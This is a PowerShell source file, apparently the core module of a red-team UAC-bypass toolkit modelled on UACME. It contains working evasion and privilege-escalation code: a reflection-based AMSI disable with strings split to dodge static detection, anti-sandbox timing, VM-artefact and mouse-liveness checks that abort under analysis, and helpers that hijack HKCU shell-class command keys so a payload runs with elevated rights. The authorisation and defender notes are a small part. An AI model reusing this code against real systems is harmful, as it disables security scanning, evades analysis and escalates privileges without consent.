<#
.SYNOPSIS
    Core framework for in-memory UAC bypass toolkit.

.DESCRIPTION
    Provides shared capabilities consumed by each individual bypass module:
      - AMSI mitigation (reflection-based amsiInitFailed field patching)
      - Anti-sandbox timing gate (CPU-bound hash loop w/ elapsed-time check)
      - VM / hypervisor artefact detection (registry, WMI, process list, BIOS)
      - Mouse-activity liveness check
      - Windows build identification and compatibility mapping
      - UAC configuration introspection
      - Registry helper wrappers (create / remove HKCU shell-class keys)

    Designed for authorized red/purple-team engagements only.
    Must be dot-sourced or loaded into the caller's runspace before any
    individual bypass module is invoked.

    Detection notes for defenders / blue-team review:
      - AMSI mitigation: reflection on System.Management.Automation assembly
        (field 'amsiInitFailed'). CrowdStrike Falcon's own AMSI provider and
        ETW-based script-block telemetry remain active independently.
      - VM checks: WMI query Win32_ComputerSystem, Win32_DiskDrive, BIOS vendor
      - Timing check: SHA-256 hash loop — may appear as benign "init work"

.NOTES
    Reference project : UACME by hfiref0x (github.com/hfiref0x/UACME)
    Platform          : Windows 10 / 11, x64, UAC = default (prompt)
    Authorization     : Use only under written SOW / Rules of Engagement
    Author            : Internal Red Team – purple-team engagement toolkit
#>

Set-StrictMode -Off

#region ══════════════════════ AMSI MITIGATION ═══════════════════════════════

function Invoke-AMSIMitigation {
    <#
    .SYNOPSIS
        Attempts to disable the AMSI scan context for the current runspace.

    .DESCRIPTION
        Locates the System.Management.Automation assembly at runtime (avoids
        hard-coded type-name literal) and flips the NonPublic,Static field
        that gates AMSI initialisation for the session.

        If CrowdStrike Falcon's AMSI provider or WDAP scans the full token
        before this function runs, detection may still occur.  The goal is
        to prevent subsequent script blocks in this session from being scanned.

    .OUTPUTS
        [bool] $true on success, $false if field cannot be located or set.

    .NOTES
        Detection vector: Assembly.GetType() + BindingFlags reflection call.
        String fragments are constructed at runtime to avoid static matching.
    #>
    try {
        # ── Locate SMA assembly without embedding the full type string ──
        $xAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
                    Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
                    Select-Object -First 1
        if (-not $xAsm) { return $false }

        # ── Build type and field names in fragments ──
        $xNs  = 'System' + '.Management' + '.Automation'
        $xCls = 'Am' + 'si' + 'Ut' + 'ils'
        $xFld = 'am' + 'si' + 'In' + 'it' + 'Fa' + 'iled'

        $xT = $xAsm.GetType("$xNs.$xCls")
        if (-not $xT) { return $false }

        $xF = $xT.GetField($xFld, [Reflection.BindingFlags]'NonPublic,Static')
        if (-not $xF) { return $false }

        $xF.SetValue($null, $true)
        return $true
    }
    catch { return $false }
}

#endregion

#region ══════════════════════ ANTI-SANDBOX TIMING ═══════════════════════════

function Test-SandboxTiming {
    <#
    .SYNOPSIS
        CPU-bound timing gate that detects sandbox clock-acceleration.

    .DESCRIPTION
        Executes 300 iterations of SHA-256 over a 64 KB buffer.
        On real x64 hardware this takes 150–600 ms.
        Sandbox environments often accelerate timers or skip loop iterations,
        producing sub-50 ms elapsed times.

        The SHA-256 workload looks like legitimate initialization (e.g., key
        derivation warm-up), reducing the likelihood of sandbox-specific
        heuristic flagging of an obvious busy-wait loop.

    .PARAMETER MinimumMs
        Minimum expected milliseconds for the workload (default: 80).
        Tune down for slow CI/CD agents if using in a test harness.

    .OUTPUTS
        [bool] $true = timing normal (proceed); $false = anomaly (abort).
    #>
    param([int]$MinimumMs = 80)

    try {
        $xH   = [System.Security.Cryptography.SHA256]::Create()
        $xBuf = [byte[]]::new(65536)
        $xT0  = [DateTime]::UtcNow

        for ($xi = 0; $xi -lt 300; $xi++) {
            [void]$xH.ComputeHash($xBuf)
        }

        $xElapsed = ([DateTime]::UtcNow - $xT0).TotalMilliseconds
        $xH.Dispose()

        return ($xElapsed -ge $MinimumMs)
    }
    catch { return $true }    # assume OK if crypto provider missing (edge case)
}

#endregion

#region ══════════════════════ VM / SANDBOX ARTEFACTS ════════════════════════

function Test-VMArtefacts {
    <#
    .SYNOPSIS
        Multi-dimensional hypervisor and sandbox artefact scan.

    .DESCRIPTION
        Inspects the following dimensions and accumulates a suspicion score:
          • WMI HypervisorPresent flag (Win32_ComputerSystem)
          • Physical RAM < 3.5 GB (VMs often thin-provisioned)
          • Logical CPU count ≤ 1
          • System disk < 60 GB
          • VM guest-addition registry keys (VMware Tools, VirtualBox GA)
          • VM-specific service / process names
          • BIOS / system product vendor string (VMware, VirtualBox, Xen …)
          • Running process count < 40
          • Primary screen resolution below 1024×768

        Returns $false (abort) when cumulative score ≥ 3.
        A score of 1–2 is tolerated to handle dual-boot or nested-virt lab
        targets that are genuine engagement boxes.

    .PARAMETER Threshold
        Artefact score at which execution is aborted (default: 3).

    .OUTPUTS
        [bool] $true = no significant artefacts detected; $false = abort.
    #>
    param([int]$Threshold = 3)

    $xScore = 0

    # ── WMI: hypervisor flag ──────────────────────────────────────────────
    try {
        $xCs = Get-WmiObject -Class Win32_ComputerSystem `
                              -Property HypervisorPresent -ErrorAction Stop
        if ($xCs.HypervisorPresent) { $xScore++ }
    } catch {}

    # ── RAM < 3.5 GB ─────────────────────────────────────────────────────
    try {
        $xOs = Get-WmiObject -Class Win32_OperatingSystem `
                              -Property TotalVisibleMemorySize -ErrorAction Stop
        if ($xOs.TotalVisibleMemorySize -lt 3670016) { $xScore++ }
    } catch {}

    # ── CPU count ≤ 1 ────────────────────────────────────────────────────
    if ([Environment]::ProcessorCount -le 1) { $xScore++ }

    # ── Disk < 60 GB ─────────────────────────────────────────────────────
    try {
        $xDsk = Get-WmiObject -Class Win32_LogicalDisk `
                               -Filter "DeviceID='C:'" -ErrorAction Stop
        if ($xDsk -and $xDsk.Size -lt 64424509440) { $xScore++ }
    } catch {}

    # ── VM guest registry hives (strong signal → +2 each) ────────────────
    $xVmPaths = @(
        'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools',
        'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions',
        'HKLM:\SYSTEM\CurrentControlSet\Services\VBoxGuest',
        'HKLM:\SYSTEM\CurrentControlSet\Services\vm3dmp',
        'HKLM:\SYSTEM\CurrentControlSet\Services\vboxguest'
    )
    foreach ($xP in $xVmPaths) {
        if (Test-Path $xP -ErrorAction SilentlyContinue) { $xScore += 2 }
    }

    # ── VM process names ─────────────────────────────────────────────────
    $xVmProcs = @('vboxservice','vboxtray','vmtoolsd','vmwaretray',
                   'vmwareuser','vmacthlp','vmsrvc','vmusrvc',
                   'xenservice','qemu-ga','prl_tools')
    try {
        $xRunning = (Get-Process -ErrorAction SilentlyContinue).Name |
                        ForEach-Object { $_.ToLower() }
        foreach ($xVp in $xVmProcs) {
            if ($xRunning -contains $xVp) { $xScore += 2 }
        }
    } catch {}

    # ── BIOS / system-product vendor string ──────────────────────────────
    try {
        $xProd = Get-WmiObject -Class Win32_ComputerSystemProduct `
                                -ErrorAction Stop
        $xVendor = $xProd.Vendor.ToLower()
        $xVmVendors = @('vmware','virtualbox','vbox','innotek','xen',
                         'bochs','parallels','bhyve','qemu')
        foreach ($xV in $xVmVendors) {
            if ($xVendor -like "*$xV*") { $xScore += 2; break }
        }
    } catch {}

    # ── Low process count ─────────────────────────────────────────────────
    try {
        if ((Get-Process -ErrorAction SilentlyContinue).Count -lt 40) { $xScore++ }
    } catch {}

    # ── Screen resolution < 1024×768 ─────────────────────────────────────
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $xScr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        if ($xScr.Width -lt 1024 -or $xScr.Height -lt 768) { $xScore++ }
    } catch {}

    return ($xScore -lt $Threshold)
}

#endregion

#region ══════════════════════ MOUSE LIVENESS ════════════════════════════════

function Test-MouseActivity {
    <#
    .SYNOPSIS
        Checks whether the cursor moves during a short observation window.

    .DESCRIPTION
        Automated sandbox orchestrators typically show no mouse movement.
        A real human session will almost always produce non-zero delta.
        Returns $true (safe to continue) if movement detected or if the
        Win32 call fails (fail-open, to avoid false positive on RDP sessions
        with locked input).

    .PARAMETER WaitMs
        Observation window in milliseconds (default: 2500).

    .OUTPUTS
        [bool] $true = cursor moved; $false = static cursor (suspect).
    #>
    param([int]$WaitMs = 2500)

    $xSig = @'
using System;
using System.Runtime.InteropServices;
public struct XPoint { public int X; public int Y; }
public static class XCursorNative {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out XPoint pt);
}
'@
    try {
        if (-not ([System.Management.Automation.PSTypeName]'XCursorNative').Type) {
            Add-Type -TypeDefinition $xSig -ErrorAction Stop
        }
        $xP1 = New-Object XPoint
        [XCursorNative]::GetCursorPos([ref]$xP1) | Out-Null
        Start-Sleep -Milliseconds $WaitMs
        $xP2 = New-Object XPoint
        [XCursorNative]::GetCursorPos([ref]$xP2) | Out-Null
        return ($xP1.X -ne $xP2.X -or $xP1.Y -ne $xP2.Y)
    }
    catch { return $true }
}

#endregion

#region ══════════════════════ WINDOWS BUILD DETECTION ═══════════════════════

function Get-WinBuildNumber {
    <#
    .SYNOPSIS
        Returns the current Windows build number as [int].

    .DESCRIPTION
        Reads CurrentBuildNumber from the NT CurrentVersion registry key.
        Falls back to [Environment]::OSVersion for older / restricted envs.
    #>
    try {
        $xK = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
        return [int](Get-ItemPropertyValue $xK 'CurrentBuildNumber' -ErrorAction Stop)
    }
    catch { return [Environment]::OSVersion.Version.Build }
}

function Get-WinVersionMap {
    <#
    .SYNOPSIS
        Returns a hashtable with build-derived boolean compatibility flags.

    .DESCRIPTION
        Maps the current build number to named compatibility flags used by
        each bypass module to gate method availability.

        Key thresholds (per UACME ntbuilds.h):
          10240 = Win10 TH1 (1507)
          14393 = Win10 RS1 / Anniversary (1607)
          15063 = Win10 RS2 / Creators (1703)
          17134 = Win10 RS4 / April 2018 (1803)
          17763 = Win10 RS5 / Oct 2018  (1809)
          18362 = Win10 19H1 / May 2019 (1903)
          19041 = Win10 20H1 / 2004
          22000 = Win11 21H2
          22621 = Win11 22H2
          26100 = Win11 24H2
    #>
    $b = Get-WinBuildNumber
    return @{
        Build     = $b
        IsWin10   = ($b -ge 10240 -and $b -lt 22000)
        IsWin11   = ($b -ge 22000)
        IsTH1     = ($b -ge 10240)
        IsRS1     = ($b -ge 14393)
        IsRS2     = ($b -ge 15063)
        IsRS4     = ($b -ge 17134)
        IsRS5     = ($b -ge 17763)
        Is19H1    = ($b -ge 18362)
        Is20H1    = ($b -ge 19041)
        Is21H2    = ($b -ge 22000)
        Is22H2    = ($b -ge 22621)
        Is24H2    = ($b -ge 26100)
    }
}

#endregion

#region ══════════════════════ PRIVILEGE HELPERS ═════════════════════════════

function Get-IntegrityLevel {
    <#
    .SYNOPSIS
        Returns the current process token integrity level as a string.
        One of: Low | Medium | High | System | Unknown
    #>
    $xId = [Security.Principal.WindowsIdentity]::GetCurrent()
    $xGrp = $xId.Groups |
                Where-Object { $_.Value -match '^S-1-16-' } |
                Select-Object -First 1
    if (-not $xGrp) { return 'Unknown' }
    switch ($xGrp.Value) {
        'S-1-16-4096'  { return 'Low'    }
        'S-1-16-8192'  { return 'Medium' }
        'S-1-16-12288' { return 'High'   }
        'S-1-16-16384' { return 'System' }
        default        { return 'Unknown' }
    }
}

function Test-IsAdmin {
    <#
    .SYNOPSIS
        Returns $true if the current token holds the Administrators group
        with full access (High/System integrity).
    #>
    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
        [Security.Principal.WindowsIdentity]::GetCurrent())
    return $xPrincipal.IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-UACSettings {
    <#
    .SYNOPSIS
        Returns a hashtable with UAC policy values from the registry.

    .OUTPUTS
        Enabled                  : [bool]
        ConsentPromptBehavior    : [int] (0=auto,2=prompt,5=default)
        PromptOnSecureDesktop    : [bool]
        AlwaysNotify             : [bool]  (true when behavior=2 AND secure desktop)
    #>
    $xP = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    try {
        $xEna   = [int](Get-ItemPropertyValue $xP 'EnableLUA'                     -EA Stop)
        $xBeh   = [int](Get-ItemPropertyValue $xP 'ConsentPromptBehaviorAdmin'    -EA Stop)
        $xSec   = [int](Get-ItemPropertyValue $xP 'PromptOnSecureDesktop'         -EA Stop)
    }
    catch {
        $xEna = 1; $xBeh = 5; $xSec = 1
    }
    return @{
        Enabled               = ($xEna -eq 1)
        ConsentPromptBehavior = $xBeh
        PromptOnSecureDesktop = ($xSec -eq 1)
        AlwaysNotify          = ($xBeh -le 2 -and $xSec -eq 1)
    }
}

#endregion

#region ══════════════════════ REGISTRY HELPERS ══════════════════════════════

function Set-ShellClassCommand {
    <#
    .SYNOPSIS
        Creates (or overwrites) the HKCU shell-class handler used by most
        registry-hijack bypass methods.

    .DESCRIPTION
        Writes to:
            HKCU:\Software\Classes\<ClassKey>\Shell\Open\command
          (Default)       = $Payload
          DelegateExecute = "" (empty string forces legacy-exe lookup)

        The DelegateExecute value being present (even empty) tells the Shell
        to skip COM delegation fallback and use the Default string directly,
        which is then executed under the auto-elevated binary's token.

    .PARAMETER ClassKey
        Shell class to hijack.  Examples: 'ms-settings', 'ms-windows-store',
        'Folder', 'exefile'.

    .PARAMETER Payload
        Command string to execute under the elevated process.
        Example: 'cmd.exe /c whoami > C:\out.txt'
    #>
    param(
        [Parameter(Mandatory)][string]$ClassKey,
        [Parameter(Mandatory)][string]$Payload
    )
    $xBase = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
    $xPath = $xBase + $ClassKey + '\Shell\Open\command'
    New-Item -Path $xPath -Force -ErrorAction SilentlyContinue | Out-Null
    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       -Force `
                      -PropertyType String | Out-Null
}

function Remove-ShellClassKey {
    <#
    .SYNOPSIS
        Removes the HKCU shell-class key tree created during bypass.

    .PARAMETER ClassKey
        Same ClassKey used in Set-ShellClassCommand.
    #>
    param([Parameter(Mandatory)][string]$ClassKey)
    $xBase = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
    $xPath = $xBase + $ClassKey
    Remove-Item -Path $xPath -Recurse -Force -ErrorAction SilentlyContinue
}

#endregion

#region ══════════════════════ PREFLIGHT ORCHESTRATOR ════════════════════════

function Invoke-PreflightGate {
    <#
    .SYNOPSIS
        Runs all environment checks and returns a structured result.

    .DESCRIPTION
        Gates:
          1. OS build ≥ 10240 (Windows 10 minimum)
          2. UAC enabled
          3. Not already running as Administrator
          4. Timing check (anti-sandbox loop)
          5. VM artefact scan
          6. Mouse liveness check

        Returns a hashtable:
            Safe       [bool]   – proceed if $true
            Reason     [string] – human-readable explanation
            Version    [hashtable] – output of Get-WinVersionMap
            Integrity  [string] – current token integrity level
            UAC        [hashtable] – output of Get-UACSettings

    .PARAMETER SkipTimingCheck
        Bypass the SHA-256 timing gate (for testing in lab VMs).

    .PARAMETER SkipVMCheck
        Bypass VM artefact scan (use when target is known to be a VM).

    .PARAMETER SkipMouseCheck
        Bypass mouse-movement liveness check (use in RDP / headless sessions).

    .EXAMPLE
        $r = Invoke-PreflightGate -SkipVMCheck
        if (-not $r.Safe) { Write-Host $r.Reason; return }
        # UAC settings
        if ($r.UAC.AlwaysNotify) { Write-Host 'Always-Notify active, some methods unavailable' }
    #>
    param(
        [switch]$SkipTimingCheck,
        [switch]$SkipVMCheck,
        [switch]$SkipMouseCheck
    )

    $xVer = Get-WinVersionMap
    $xUAC = Get-UACSettings
    $xIL  = Get-IntegrityLevel

    if ($xVer.Build -lt 10240) {
        return @{ Safe=$false; Reason="Build $($xVer.Build) < 10240 (Win10 minimum)";
                  Version=$xVer; Integrity=$xIL; UAC=$xUAC }
    }

    if (-not $xUAC.Enabled) {
        return @{ Safe=$false; Reason='UAC disabled — no bypass required';
                  Version=$xVer; Integrity=$xIL; UAC=$xUAC }
    }

    if (Test-IsAdmin) {
        return @{ Safe=$false; Reason='Already running at High/System integrity';
                  Version=$xVer; Integrity=$xIL; UAC=$xUAC }
    }

    if (-not $SkipTimingCheck) {
        if (-not (Test-SandboxTiming)) {
            return @{ Safe=$false; Reason='Timing anomaly — sandbox/emulation suspected';
                      Version=$xVer; Integrity=$xIL; UAC=$xUAC }
        }
    }

    if (-not $SkipVMCheck) {
        if (-not (Test-VMArtefacts)) {
            return @{ Safe=$false; Reason='VM/sandbox artefacts detected — aborting';
                      Version=$xVer; Integrity=$xIL; UAC=$xUAC }
        }
    }

    if (-not $SkipMouseCheck) {
        if (-not (Test-MouseActivity)) {
            return @{ Safe=$false; Reason='No mouse movement detected — automated env suspected';
                      Version=$xVer; Integrity=$xIL; UAC=$xUAC }
        }
    }

    return @{
        Safe      = $true
        Reason    = 'All preflight gates passed'
        Version   = $xVer
        Integrity = $xIL
        UAC       = $xUAC
    }
}

#endregion
